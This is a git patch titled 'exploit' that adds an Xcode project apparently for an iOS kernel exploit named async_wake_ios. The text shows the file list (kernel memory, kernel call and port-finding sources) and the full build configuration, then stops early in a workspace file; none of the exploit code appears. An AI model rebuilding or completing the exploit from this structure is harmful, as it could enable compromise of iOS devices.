From 1b8f3d93c16b2d28e01f6144f0b6ca4ca59074fa Mon Sep 17 00:00:00 2001
From: Stephen Pardue <spard6159@icloud.com>
Date: Wed, 13 Dec 2017 12:59:13 -0500
Subject: [PATCH] exploit

---
 async_wake_ios.xcodeproj/project.pbxproj                                                                   | 393 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios.xcodeproj/project.xcworkspace/contents.xcworkspacedata                                      |   7 +++++++
 async_wake_ios.xcodeproj/project.xcworkspace/xcuserdata/ianbeer.xcuserdatad/UserInterfaceState.xcuserstate | Bin 0 -> 576537 bytes
 async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcdebugger/Breakpoints_v2.xcbkptlist               |  23 +++++++++++++++++++++++
 async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcschemes/xcschememanagement.plist                 |  14 ++++++++++++++
 async_wake_ios/AppDelegate.h                                                                               |   9 +++++++++
 async_wake_ios/AppDelegate.m                                                                               |  45 +++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/Assets.xcassets/AppIcon.appiconset/Contents.json                                            |  93 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/Base.lproj/LaunchScreen.storyboard                                                          |  25 +++++++++++++++++++++++++
 async_wake_ios/Base.lproj/Main.storyboard                                                                  |  24 ++++++++++++++++++++++++
 async_wake_ios/Info.plist                                                                                  |  45 +++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/README                                                                                      | 168 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/ViewController.h                                                                            |   7 +++++++
 async_wake_ios/ViewController.m                                                                            |  23 +++++++++++++++++++++++
 async_wake_ios/arm64_state.h                                                                               | 131 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/async_wake.c                                                                                |
 async_wake_ios/async_wake.h                                                                                |   8 ++++++++
 async_wake_ios/early_kalloc.c                                                                              |  69 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/early_kalloc.h                                                                              |   8 ++++++++
 async_wake_ios/find_port.c                                                                                 | 253 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/find_port.h                                                                                 |   8 ++++++++
 async_wake_ios/kcall.c                                                                                     | 265 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/kcall.h                                                                                     |   8 ++++++++
 async_wake_ios/kdbg.c                                                                                      | 805 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/kdbg.h                                                                                      |   9 +++++++++
 async_wake_ios/kmem.c                                                                                      | 307 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/kmem.h                                                                                      |  30 ++++++++++++++++++++++++++++++
 async_wake_ios/kutils.c                                                                                    |  83 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/kutils.h                                                                                    |  14 ++++++++++++++
 async_wake_ios/main.m                                                                                      |   8 ++++++++
 async_wake_ios/symbols.c                                                                                   | 205 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 async_wake_ios/symbols.h                                                                                   |  84 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 32 files changed, 3872 insertions(+)
 create mode 100644 async_wake_ios.xcodeproj/project.pbxproj
 create mode 100644 async_wake_ios.xcodeproj/project.xcworkspace/contents.xcworkspacedata
 create mode 100644 async_wake_ios.xcodeproj/project.xcworkspace/xcuserdata/ianbeer.xcuserdatad/UserInterfaceState.xcuserstate
 create mode 100644 async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcdebugger/Breakpoints_v2.xcbkptlist
 create mode 100644 async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcschemes/xcschememanagement.plist
 create mode 100644 async_wake_ios/AppDelegate.h
 create mode 100644 async_wake_ios/AppDelegate.m
 create mode 100644 async_wake_ios/Assets.xcassets/AppIcon.appiconset/Contents.json
 create mode 100644 async_wake_ios/Base.lproj/LaunchScreen.storyboard
 create mode 100644 async_wake_ios/Base.lproj/Main.storyboard
 create mode 100644 async_wake_ios/Info.plist
 create mode 100644 async_wake_ios/README
 create mode 100644 async_wake_ios/ViewController.h
 create mode 100644 async_wake_ios/ViewController.m
 create mode 100644 async_wake_ios/arm64_state.h
 create mode 100644 async_wake_ios/async_wake.c
 create mode 100644 async_wake_ios/async_wake.h
 create mode 100644 async_wake_ios/early_kalloc.c
 create mode 100644 async_wake_ios/early_kalloc.h
 create mode 100644 async_wake_ios/find_port.c
 create mode 100644 async_wake_ios/find_port.h
 create mode 100644 async_wake_ios/kcall.c
 create mode 100644 async_wake_ios/kcall.h
 create mode 100644 async_wake_ios/kdbg.c
 create mode 100644 async_wake_ios/kdbg.h
 create mode 100644 async_wake_ios/kmem.c
 create mode 100644 async_wake_ios/kmem.h
 create mode 100644 async_wake_ios/kutils.c
 create mode 100644 async_wake_ios/kutils.h
 create mode 100644 async_wake_ios/main.m
 create mode 100644 async_wake_ios/symbols.c
 create mode 100644 async_wake_ios/symbols.h

diff --git a/async_wake_ios.xcodeproj/project.pbxproj b/async_wake_ios.xcodeproj/project.pbxproj
new file mode 100644
index 0000000..3719fcd
--- /dev/null
+++ b/async_wake_ios.xcodeproj/project.pbxproj
@@ -0,0 +1,393 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 48;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		B003EB351FC583CB00C58441 /* kmem.c in Sources */ = {isa = PBXBuildFile; fileRef = B003EB331FC583CA00C58441 /* kmem.c */; };
+		B003EB381FC5863800C58441 /* find_port.c in Sources */ = {isa = PBXBuildFile; fileRef = B003EB361FC5863800C58441 /* find_port.c */; };
+		B003EB3B1FC58F4900C58441 /* kdbg.c in Sources */ = {isa = PBXBuildFile; fileRef = B003EB391FC58F4900C58441 /* kdbg.c */; };
+		B04E25091FCD6DB300F09CCE /* kutils.c in Sources */ = {isa = PBXBuildFile; fileRef = B04E25071FCD6DB300F09CCE /* kutils.c */; };
+		B07A023E1FB09B6F0018ACE5 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = B07A023D1FB09B6F0018ACE5 /* AppDelegate.m */; };
+		B07A02411FB09B6F0018ACE5 /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = B07A02401FB09B6F0018ACE5 /* ViewController.m */; };
+		B07A02441FB09B6F0018ACE5 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B07A02421FB09B6F0018ACE5 /* Main.storyboard */; };
+		B07A02461FB09B6F0018ACE5 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B07A02451FB09B6F0018ACE5 /* Assets.xcassets */; };
+		B07A02491FB09B6F0018ACE5 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B07A02471FB09B6F0018ACE5 /* LaunchScreen.storyboard */; };
+		B07A024C1FB09B6F0018ACE5 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = B07A024B1FB09B6F0018ACE5 /* main.m */; };
+		B07A02541FB09C3D0018ACE5 /* async_wake.c in Sources */ = {isa = PBXBuildFile; fileRef = B07A02521FB09C3D0018ACE5 /* async_wake.c */; };
+		B0D79D621FDED41000B4F233 /* README in Resources */ = {isa = PBXBuildFile; fileRef = B0D79D611FDED41000B4F233 /* README */; };
+		B0EF11141FCC6F9C00C1D14E /* kcall.c in Sources */ = {isa = PBXBuildFile; fileRef = B0EF11121FCC6F9C00C1D14E /* kcall.c */; };
+		B0EF11171FCC784B00C1D14E /* symbols.c in Sources */ = {isa = PBXBuildFile; fileRef = B0EF11151FCC784B00C1D14E /* symbols.c */; };
+		B0F5AA3F1FDE87E90073FD88 /* early_kalloc.c in Sources */ = {isa = PBXBuildFile; fileRef = B0F5AA3D1FDE87E80073FD88 /* early_kalloc.c */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		B003EB331FC583CA00C58441 /* kmem.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = kmem.c; sourceTree = "<group>"; };
+		B003EB341FC583CA00C58441 /* kmem.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = kmem.h; sourceTree = "<group>"; };
+		B003EB361FC5863800C58441 /* find_port.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = find_port.c; sourceTree = "<group>"; };
+		B003EB371FC5863800C58441 /* find_port.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = find_port.h; sourceTree = "<group>"; };
+		B003EB391FC58F4900C58441 /* kdbg.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = kdbg.c; sourceTree = "<group>"; };
+		B003EB3A1FC58F4900C58441 /* kdbg.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = kdbg.h; sourceTree = "<group>"; };
+		B04E25071FCD6DB300F09CCE /* kutils.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = kutils.c; sourceTree = "<group>"; };
+		B04E25081FCD6DB300F09CCE /* kutils.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = kutils.h; sourceTree = "<group>"; };
+		B04E250A1FCF083A00F09CCE /* arm64_state.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = arm64_state.h; sourceTree = "<group>"; };
+		B07A02391FB09B6F0018ACE5 /* async_wake_ios.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = async_wake_ios.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		B07A023C1FB09B6F0018ACE5 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
+		B07A023D1FB09B6F0018ACE5 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
+		B07A023F1FB09B6F0018ACE5 /* ViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ViewController.h; sourceTree = "<group>"; };
+		B07A02401FB09B6F0018ACE5 /* ViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ViewController.m; sourceTree = "<group>"; };
+		B07A02431FB09B6F0018ACE5 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		B07A02451FB09B6F0018ACE5 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		B07A02481FB09B6F0018ACE5 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		B07A024A1FB09B6F0018ACE5 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		B07A024B1FB09B6F0018ACE5 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
+		B07A02521FB09C3D0018ACE5 /* async_wake.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = async_wake.c; sourceTree = "<group>"; };
+		B07A02531FB09C3D0018ACE5 /* async_wake.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = async_wake.h; sourceTree = "<group>"; };
+		B0D79D611FDED41000B4F233 /* README */ = {isa = PBXFileReference; lastKnownFileType = text; path = README; sourceTree = "<group>"; };
+		B0EF11121FCC6F9C00C1D14E /* kcall.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = kcall.c; sourceTree = "<group>"; };
+		B0EF11131FCC6F9C00C1D14E /* kcall.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = kcall.h; sourceTree = "<group>"; };
+		B0EF11151FCC784B00C1D14E /* symbols.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = symbols.c; sourceTree = "<group>"; };
+		B0EF11161FCC784B00C1D14E /* symbols.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = symbols.h; sourceTree = "<group>"; };
+		B0F5AA3D1FDE87E80073FD88 /* early_kalloc.c */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.c; path = early_kalloc.c; sourceTree = "<group>"; };
+		B0F5AA3E1FDE87E80073FD88 /* early_kalloc.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = early_kalloc.h; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		B07A02361FB09B6F0018ACE5 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		B07A02301FB09B6F0018ACE5 = {
+			isa = PBXGroup;
+			children = (
+				B07A023B1FB09B6F0018ACE5 /* async_wake_ios */,
+				B07A023A1FB09B6F0018ACE5 /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		B07A023A1FB09B6F0018ACE5 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				B07A02391FB09B6F0018ACE5 /* async_wake_ios.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		B07A023B1FB09B6F0018ACE5 /* async_wake_ios */ = {
+			isa = PBXGroup;
+			children = (
+				B07A023C1FB09B6F0018ACE5 /* AppDelegate.h */,
+				B07A023D1FB09B6F0018ACE5 /* AppDelegate.m */,
+				B07A023F1FB09B6F0018ACE5 /* ViewController.h */,
+				B07A02401FB09B6F0018ACE5 /* ViewController.m */,
+				B07A02421FB09B6F0018ACE5 /* Main.storyboard */,
+				B07A02451FB09B6F0018ACE5 /* Assets.xcassets */,
+				B07A02471FB09B6F0018ACE5 /* LaunchScreen.storyboard */,
+				B07A024A1FB09B6F0018ACE5 /* Info.plist */,
+				B07A024B1FB09B6F0018ACE5 /* main.m */,
+				B07A02521FB09C3D0018ACE5 /* async_wake.c */,
+				B07A02531FB09C3D0018ACE5 /* async_wake.h */,
+				B003EB331FC583CA00C58441 /* kmem.c */,
+				B003EB341FC583CA00C58441 /* kmem.h */,
+				B04E250A1FCF083A00F09CCE /* arm64_state.h */,
+				B003EB361FC5863800C58441 /* find_port.c */,
+				B003EB371FC5863800C58441 /* find_port.h */,
+				B003EB391FC58F4900C58441 /* kdbg.c */,
+				B003EB3A1FC58F4900C58441 /* kdbg.h */,
+				B0EF11151FCC784B00C1D14E /* symbols.c */,
+				B0EF11161FCC784B00C1D14E /* symbols.h */,
+				B0EF11121FCC6F9C00C1D14E /* kcall.c */,
+				B0D79D611FDED41000B4F233 /* README */,
+				B0EF11131FCC6F9C00C1D14E /* kcall.h */,
+				B04E25071FCD6DB300F09CCE /* kutils.c */,
+				B04E25081FCD6DB300F09CCE /* kutils.h */,
+				B0F5AA3D1FDE87E80073FD88 /* early_kalloc.c */,
+				B0F5AA3E1FDE87E80073FD88 /* early_kalloc.h */,
+			);
+			path = async_wake_ios;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		B07A02381FB09B6F0018ACE5 /* async_wake_ios */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = B07A024F1FB09B6F0018ACE5 /* Build configuration list for PBXNativeTarget "async_wake_ios" */;
+			buildPhases = (
+				B07A02351FB09B6F0018ACE5 /* Sources */,
+				B07A02361FB09B6F0018ACE5 /* Frameworks */,
+				B07A02371FB09B6F0018ACE5 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = async_wake_ios;
+			productName = async_wake_ios;
+			productReference = B07A02391FB09B6F0018ACE5 /* async_wake_ios.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		B07A02311FB09B6F0018ACE5 /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastUpgradeCheck = 0910;
+				ORGANIZATIONNAME = "Ian Beer";
+				TargetAttributes = {
+					B07A02381FB09B6F0018ACE5 = {
+						CreatedOnToolsVersion = 9.1;
+						ProvisioningStyle = Automatic;
+					};
+				};
+			};
+			buildConfigurationList = B07A02341FB09B6F0018ACE5 /* Build configuration list for PBXProject "async_wake_ios" */;
+			compatibilityVersion = "Xcode 8.0";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = B07A02301FB09B6F0018ACE5;
+			productRefGroup = B07A023A1FB09B6F0018ACE5 /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				B07A02381FB09B6F0018ACE5 /* async_wake_ios */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		B07A02371FB09B6F0018ACE5 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				B0D79D621FDED41000B4F233 /* README in Resources */,
+				B07A02491FB09B6F0018ACE5 /* LaunchScreen.storyboard in Resources */,
+				B07A02461FB09B6F0018ACE5 /* Assets.xcassets in Resources */,
+				B07A02441FB09B6F0018ACE5 /* Main.storyboard in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		B07A02351FB09B6F0018ACE5 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				B003EB351FC583CB00C58441 /* kmem.c in Sources */,
+				B0EF11171FCC784B00C1D14E /* symbols.c in Sources */,
+				B07A02411FB09B6F0018ACE5 /* ViewController.m in Sources */,
+				B04E25091FCD6DB300F09CCE /* kutils.c in Sources */,
+				B07A024C1FB09B6F0018ACE5 /* main.m in Sources */,
+				B003EB381FC5863800C58441 /* find_port.c in Sources */,
+				B07A02541FB09C3D0018ACE5 /* async_wake.c in Sources */,
+				B07A023E1FB09B6F0018ACE5 /* AppDelegate.m in Sources */,
+				B003EB3B1FC58F4900C58441 /* kdbg.c in Sources */,
+				B0EF11141FCC6F9C00C1D14E /* kcall.c in Sources */,
+				B0F5AA3F1FDE87E90073FD88 /* early_kalloc.c in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXVariantGroup section */
+		B07A02421FB09B6F0018ACE5 /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				B07A02431FB09B6F0018ACE5 /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+		B07A02471FB09B6F0018ACE5 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				B07A02481FB09B6F0018ACE5 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		B07A024D1FB09B6F0018ACE5 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = dwarf;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				ENABLE_TESTABILITY = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.1;
+				MTL_ENABLE_DEBUG_INFO = YES;
+				ONLY_ACTIVE_ARCH = YES;
+				SDKROOT = iphoneos;
+			};
+			name = Debug;
+		};
+		B07A024E1FB09B6F0018ACE5 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ANALYZER_NONNULL = YES;
+				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
+				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
+				CLANG_CXX_LIBRARY = "libc++";
+				CLANG_ENABLE_MODULES = YES;
+				CLANG_ENABLE_OBJC_ARC = YES;
+				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
+				CLANG_WARN_BOOL_CONVERSION = YES;
+				CLANG_WARN_COMMA = YES;
+				CLANG_WARN_CONSTANT_CONVERSION = YES;
+				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
+				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
+				CLANG_WARN_EMPTY_BODY = YES;
+				CLANG_WARN_ENUM_CONVERSION = YES;
+				CLANG_WARN_INFINITE_RECURSION = YES;
+				CLANG_WARN_INT_CONVERSION = YES;
+				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
+				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
+				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
+				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
+				CLANG_WARN_STRICT_PROTOTYPES = YES;
+				CLANG_WARN_SUSPICIOUS_MOVE = YES;
+				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
+				CLANG_WARN_UNREACHABLE_CODE = YES;
+				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
+				CODE_SIGN_IDENTITY = "iPhone Developer";
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				ENABLE_NS_ASSERTIONS = NO;
+				ENABLE_STRICT_OBJC_MSGSEND = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu11;
+				GCC_NO_COMMON_BLOCKS = YES;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
+				GCC_WARN_UNDECLARED_SELECTOR = YES;
+				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
+				GCC_WARN_UNUSED_FUNCTION = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.1;
+				MTL_ENABLE_DEBUG_INFO = NO;
+				SDKROOT = iphoneos;
+				VALIDATE_PRODUCT = YES;
+			};
+			name = Release;
+		};
+		B07A02501FB09B6F0018ACE5 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 854G7LGZ42;
+				INFOPLIST_FILE = async_wake_ios/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				OTHER_LDFLAGS = (
+					"-framework",
+					IOKit,
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "com.example.async-wake-ios";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Debug;
+		};
+		B07A02511FB09B6F0018ACE5 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				CODE_SIGN_STYLE = Automatic;
+				DEVELOPMENT_TEAM = 854G7LGZ42;
+				INFOPLIST_FILE = async_wake_ios/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
+				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks";
+				OTHER_LDFLAGS = (
+					"-framework",
+					IOKit,
+				);
+				PRODUCT_BUNDLE_IDENTIFIER = "com.example.async-wake-ios";
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				TARGETED_DEVICE_FAMILY = "1,2";
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		B07A02341FB09B6F0018ACE5 /* Build configuration list for PBXProject "async_wake_ios" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				B07A024D1FB09B6F0018ACE5 /* Debug */,
+				B07A024E1FB09B6F0018ACE5 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		B07A024F1FB09B6F0018ACE5 /* Build configuration list for PBXNativeTarget "async_wake_ios" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				B07A02501FB09B6F0018ACE5 /* Debug */,
+				B07A02511FB09B6F0018ACE5 /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = B07A02311FB09B6F0018ACE5 /* Project object */;
+}
diff --git a/async_wake_ios.xcodeproj/project.xcworkspace/contents.xcworkspacedata b/async_wake_ios.xcodeproj/project.xcworkspace/contents.xcworkspacedata
new file mode 100644
index 0000000..87ac600
--- /dev/null
+++ b/async_wake_ios.xcodeproj/project.xcworkspace/contents.xcworkspacedata
@@ -0,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Workspace
+   version = "1.0">
